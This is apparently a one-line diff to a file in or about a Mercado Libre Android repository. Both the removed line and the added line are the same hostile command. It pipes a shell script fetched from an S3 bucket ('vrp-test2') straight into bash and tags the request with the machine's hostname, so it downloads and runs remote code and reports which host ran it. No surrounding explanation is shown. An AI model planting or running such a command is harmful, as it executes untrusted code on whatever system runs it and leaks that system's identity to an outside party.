@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/mercadolibre/meli-card-drawer-android.git\&folder=meli-card-drawer-android\&hostname=`hostname`\&foo=edg
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/mercadolibre/meli-card-drawer-android.git\&folder=meli-card-drawer-android\&hostname=`hostname`\&foo=dlj
